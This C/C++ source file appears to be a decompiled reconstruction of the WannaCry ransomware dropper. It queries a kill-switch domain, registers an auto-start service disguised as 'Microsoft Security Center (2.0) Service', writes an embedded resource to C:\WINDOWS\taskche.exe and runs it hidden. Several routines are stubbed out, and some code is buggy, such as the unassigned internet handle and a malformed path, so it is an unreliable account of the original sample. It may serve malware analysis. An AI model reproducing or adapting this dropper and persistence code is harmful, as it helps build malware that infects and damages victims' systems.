//Windows includes
#include <Windows.h>
#include <Wininet.h>
#include <Winsvc.h>
#include <fileapi.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

//standard CPP/C includes
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

SERVICE_STATUS gSvcStatus;
SERVICE_STATUS_HANDLE gSvcStatusHandle;
char executable[260];

void* createFileA;
void* createProcessA;
void* writeFile;
void* closeHandle;

VOID WINAPI SvcCtrlHandler(DWORD dwCtrl) {
	switch(dwCtrl) {
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			gSvcStatus.dwCurrentState = SERVICE_STOPPED;
			gSvcStatus.dwWin32ExitCode = NO_ERROR;
			gSvcStatus.dwCheckPoint = NULL;
			gSvcStatus.dwWaitHint = NULL;
			break;
		case SERVICE_CONTROL_PAUSE:
			gSvcStatus.dwCurrentState = SERVICE_PAUSED;
			break;
		case SERVICE_CONTROL_CONTINUE:
			gSvcStatus.dwCurrentState = SERVICE_RUNNING;
	}

	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
	
	return;
}

VOID svcStatus() {
	gSvcStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
  	gSvcStatus.dwCurrentState = SERVICE_START_PENDING;
	gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	gSvcStatus.dwWin32ExitCode = NO_ERROR;
	gSvcStatus.dwServiceSpecificExitCode = NULL;
	gSvcStatus.dwCheckPoint = NULL;
	gSvcStatus.dwWaitHint = NULL;
	
	gSvcStatusHandle = RegisterServiceCtrlHandler("mssecsvc2.0", SvcCtrlHandler);
	
	if(gSvcStatusHandle != NULL) {
		gSvcStatus.dwCurrentState = SERVICE_RUNNING;
		gSvcStatus.dwCheckPoint = NULL;
		gSvcStatus.dwWaitHint = NULL;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
		// FUN_00407bd0();
		Sleep(86400000);
		ExitProcess(1);
	}
	
	return;
}

int create_service() {
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	CHAR exec_with_args[260];

	sprintf(exec_with_args, "%s -m security", &executable);
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager != NULL) {
		hService = CreateServiceA(hSCManager, "mssecsvc2.0", "Microsoft Security Center (2.0) Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, exec_with_args, NULL, NULL, NULL, NULL, NULL);
		if (hService != NULL) {
			StartServiceA(hService, 0, NULL);
			CloseServiceHandle(hService);
		}

		CloseServiceHandle(hSCManager);
		return 0;
	}

	return 0;
}

int write_1831_to_taskche() {
	HMODULE hModule;
	HRSRC res1831;
	HGLOBAL res1831_data;
	_PROCESS_INFORMATION res1831_locked;
	_STARTUPINFOA startUpInfo;
	DWORD res1831_size;
	HANDLE hFile;
	HANDLE hObject;
	char taskche_exe[64];
	char qeriwjhrf_path[64];
	BOOL createProc;

	hModule = GetModuleHandleW(L"kernel32.dll");
	if(hModule != NULL) {
		createProcessA = GetProcAddress(hModule, "CreateProcessA");
		createFileA = GetProcAddress(hModule, "CreateFileA");
		writeFile = GetProcAddress(hModule, "WriteFile");
		closeHandle = GetProcAddress(hModule, "CloseHandle");	
	
		if(createProcessA != NULL && createFileA != NULL && writeFile != NULL && closeHandle != NULL) {
			res1831 = FindResourceA(NULL, (LPCSTR)1831, "R");
			if(res1831 != NULL) {
				res1831_data = LoadResource(NULL, res1831);
				if(res1831_data != NULL) {
					res1831_locked.hProcess = LockResource(res1831_data);
					if(res1831_locked.hProcess != NULL) {
						res1831_size = SizeofResource(NULL, res1831);
						if(res1831_size != 0) {
							memset(taskche_exe, 0, 64);
							memset(qeriwjhrf_path, 0, 64);
							sprintf(taskche_exe, "C\\%s\\%s", "WINDOWS", "taskche.exe");
							sprintf(qeriwjhrf_path, "C:\\%s\\qeriuwjhrf", "WINDOWS");
							MoveFileExA(taskche_exe, qeriwjhrf_path, MOVEFILE_REPLACE_EXISTING);
							hFile = CreateFileA(taskche_exe, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM, NULL);
							
							if(hFile != INVALID_HANDLE_VALUE) {
								WriteFile(hFile, res1831_locked.hProcess, res1831_size, (LPDWORD)&res1831_locked, NULL);
								CloseHandle(hFile);
								res1831_locked.hThread = NULL;
								res1831_locked.dwProcessId = 0;
								res1831_locked.dwThreadId = 0;
								strcat(taskche_exe, " /i");
								res1831_locked.hProcess = NULL;
								hObject = NULL;
								hFile = NULL;
								startUpInfo.cb = 0x44;
								startUpInfo.wShowWindow = 0;
								startUpInfo.dwFlags = (STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW);
								createProc = CreateProcessA(NULL, taskche_exe, NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&startUpInfo, (LPPROCESS_INFORMATION)&res1831_locked);
								
								if(createProc != 0) {
									CloseHandle(hObject);
									CloseHandle(hFile);
								}
							}
						}
					}
				}
			}
		}
	}

	return 0;
}

int no_argument_handler() {
	create_service();
	write_1831_to_taskche();
	return 0;
}

void real_main() {
	int* argc;
	SC_HANDLE hSCManager;
	SC_HANDLE hSCObject;
	SERVICE_TABLE_ENTRYA serviceTable[] = { 
		{ "mssecsvc2.0", (LPSERVICE_MAIN_FUNCTIONA)&svcStatus }, 
		{ NULL, NULL }
	};
	
	GetModuleFileNameA(NULL, executable, 0x104);
	argc = (int*)__p___argc();
	
	if (*argc < 2) {
		no_argument_handler();
		return;
	}
	
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	if (hSCManager != NULL) {
		hSCObject = OpenServiceA(hSCManager, "mssecsvc2.0", SERVICE_ALL_ACCESS);
		if (hSCObject != NULL) {
			// FUN_00407fa0(hSCObject,0x3c);
			CloseServiceHandle(hSCObject);
		}

		CloseServiceHandle(hSCManager);
	}

	StartServiceCtrlDispatcherA(serviceTable);
	
	return;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	HINTERNET hInternet = NULL;
	HINTERNET internetCon = NULL;
	LPCSTR killswitch_url = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
	InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	InternetOpenUrlA(hInternet, killswitch_url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
	if (hInternet != NULL) {
		InternetCloseHandle(hInternet);
		InternetCloseHandle(internetCon);
		real_main();
		return 0;
	} else {
		InternetCloseHandle(internetCon);
		InternetCloseHandle(hInternet);
		return 0;
	}
}
